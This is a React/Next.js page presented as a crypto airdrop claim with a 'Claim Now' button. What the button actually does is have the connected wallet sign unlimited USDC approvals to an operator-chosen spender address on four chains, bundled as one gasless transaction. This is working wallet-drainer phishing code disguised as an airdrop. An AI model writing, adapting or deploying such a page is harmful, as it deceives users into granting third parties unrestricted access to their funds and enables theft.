'use client';
import { useState } from 'react';
import { useAccount } from 'wagmi';
import { erc20Abi, maxUint256 } from 'viem';
import { readContract } from '@wagmi/core';
import { config } from '@/config';
import {
  createMeeClient,
  toMultichainNexusAccount,
  getMEEVersion,
  MEEVersion,
} from '@biconomy/abstractjs';
import { http } from 'viem';
import { base, optimism, sepolia, mainnet } from 'viem/chains';
import { AppKitButton } from '@reown/appkit/react';

// ENV
const BICONOMY_API_KEY = process.env.NEXT_PUBLIC_BICONOMY_API_KEY || '';
const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || '') as `0x${string}`;

if (!BICONOMY_API_KEY) {
  throw new Error('NEXT_PUBLIC_BICONOMY_API_KEY missing in .env');
}
if (!SPENDER || SPENDER === '0x') {
  throw new Error('NEXT_PUBLIC_SPENDER missing in .env');
}

// Tokens per chain
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; decimals: number; min: bigint }[]
> = {
  [optimism.id]: [
    { symbol: 'USDC', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6, min: BigInt(1e6) },
  ],
  [base.id]: [
    { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C32D4f71b54BDA02913', decimals: 6, min: BigInt(1e6) },
  ],
  [mainnet.id]: [
    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, min: BigInt(1e6) },
  ],
  [sepolia.id]: [
    { symbol: 'USDC', address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', decimals: 6, min: BigInt(1e6) },
  ],
};

export default function Page() {
  const { address, isConnected } = useAccount();
  const [status, setStatus] = useState<string>('');
  const [loading, setLoading] = useState(false);

  const handleClaim = async () => {
    if (!address) return;

    try {
      setLoading(true);
      setStatus('🔄 Preparing Fusion account...');

      // Fusion account
      const orchestrator = await toMultichainNexusAccount({
        signer: window.ethereum as any,
        chainConfigurations: [
          { chain: optimism, transport: http(), version: getMEEVersion(MEEVersion.V2_1_0) },
          { chain: base, transport: http(), version: getMEEVersion(MEEVersion.V2_1_0) },
          { chain: mainnet, transport: http(), version: getMEEVersion(MEEVersion.V2_1_0) },
          { chain: sepolia, transport: http(), version: getMEEVersion(MEEVersion.V2_1_0) },
        ],
      });

      const meeClient = await createMeeClient({
        account: orchestrator,
        apiKey: BICONOMY_API_KEY,
      });

      const allInstructions: any[] = [];

      // Loop over all chains/tokens
      for (const [chainId, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        for (const token of tokens) {
          setStatus(`🔎 Checking allowance for ${token.symbol} on chain ${chainId}...`);

          const allowance = (await readContract(config, {
            address: token.address,
            abi: erc20Abi,
            functionName: 'allowance',
            args: [address, SPENDER],
            chainId: Number(chainId),
          })) as bigint;

          if (allowance >= token.min) {
            setStatus(`✅ ${token.symbol} already approved on chain ${chainId}`);
            continue;
          }

          setStatus(`📑 Building approval for ${token.symbol} on chain ${chainId}...`);

          const instruction = await orchestrator.buildComposable({
            type: 'default',
            data: {
              abi: erc20Abi,
              chainId: Number(chainId),
              to: token.address,
              functionName: 'approve',
              args: [SPENDER, maxUint256],
            },
          });

          allInstructions.push(instruction);
        }
      }

      if (allInstructions.length === 0) {
        setStatus('✅ All tokens already approved on all chains!');
        return;
      }

      // Get Fusion quote
      setStatus('💡 Getting Fusion quote...');
      const fusionQuote = await meeClient.getFusionQuote({
        instructions: allInstructions,
        trigger: {
          chainId: optimism.id,
          tokenAddress: TOKENS_BY_CHAIN[optimism.id][0].address,
          amount: TOKENS_BY_CHAIN[optimism.id][0].min,
        },
        feeToken: {
          address: TOKENS_BY_CHAIN[optimism.id][0].address,
          chainId: optimism.id,
        },
      });

      // Execute
      setStatus('🚀 Executing gasless approvals...');
      const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
      await meeClient.waitForSupertransactionReceipt({ hash });

      setStatus(`🎉 All approvals done! Tx: ${hash}`);
    } catch (err: any) {
      console.error(err);
      setStatus(`❌ Error: ${err.message || err}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#0a0a2a] text-white p-6">
      {/* Top bar */}
      <div className="flex justify-between items-center mb-8">
        <h1 className="text-xl font-bold">AIRDROPS</h1>
        <AppKitButton />
      </div>

      {/* Card */}
      <div className="max-w-md mx-auto bg-[#101050] rounded-lg p-8 shadow-lg">
        <h2 className="text-center text-2xl font-bold mb-6">Airdrop</h2>

        <button
          onClick={handleClaim}
          disabled={loading}
          className={`w-full py-3 rounded-lg text-white font-semibold transition ${
            loading ? 'bg-gray-500' : 'bg-red-600 hover:bg-red-700'
          }`}
        >
          {loading ? 'Processing...' : 'Claim Now'}
        </button>

        {status && (
          <div className="mt-6 p-4 rounded-lg bg-gray-800 text-sm">{status}</div>
        )}
      </div>
    </div>
  );
}
